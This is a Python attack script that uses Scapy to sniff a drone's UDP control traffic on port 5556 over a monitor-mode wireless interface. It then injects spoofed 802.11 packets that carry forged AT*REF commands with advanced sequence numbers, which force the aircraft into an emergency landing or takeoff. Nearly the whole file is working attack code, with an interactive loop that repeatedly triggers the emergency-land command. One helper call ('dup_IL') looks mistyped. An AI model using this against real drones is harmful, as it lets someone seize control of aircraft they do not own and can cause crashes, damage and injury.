import threading
import dup
from scapy.all import sniff, conf
from scapy.all import Raw, sendp

conf.iface = 'mon0'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'


class InterceptThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.cur_pkt = None
        self.seq = 0
        self.found_uav = False

    def run(self):
        sniff(prn=self.intercept_pkt, filter='udp port 5556')

    def intercept_pkt(self, pkt):
        if not self.found_uav:
            print('[*] UAV Found.')
            self.found_uav = True

        self.cur_pkt = pkt
        raw = pkt.sprintf('%Raw.load%')

        try:
            self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
        except Exception as e:
            print(f'{"":>3}[-] Exception: {e.__class__.__name__}')
            self.seq = 0

    def inject_cmd(self, cmd):
        radio = dup.dup_radio(self.cur_pkt)
        dot11 = dup.dup_dot11(self.cur_pkt)
        snap = dup.dup_snap(self.cur_pkt)
        llc = dup.dup_LLC(self.cur_pkt)
        ip = dup.dup_IL(self.cur_pkt)
        udp = dup.dup_UDP(self.cur_pkt)
        raw = Raw(load=cmd)
        inject_pkt = radio / dot11 / llc / snap / ip / udp / raw
        sendp(inject_pkt)

    def emergency_land(self):
        spoof_seq = self.seq + 100
        watch = f'AT*COMWDG={spoof_seq}\r'
        to_cmd = f'AT*REF={spoof_seq + 1},{EMER}\r'
        self.inject_cmd(watch)
        self.inject_cmd(to_cmd)

    def takeoff(self):
        spoof_seq = self.seq + 100
        watch = f'AT*COMWDG={spoof_seq}\r'
        to_cmd = f'AT*REF={spoof_seq + 1},{TAKEOFF}\r'
        self.inject_cmd(watch)
        self.inject_cmd(to_cmd)


if __name__ == '__main__':
    uav_intercept = InterceptThread()
    uav_intercept.start()
    print('[*] Listening for UAV Traffic. Please WAIT...')

    while not uav_intercept.found_uav:
        pass

    while True:
        tmp = input('[-] Press ENTER to Emergency Land UAV.')
        uav_intercept.emergency_land()
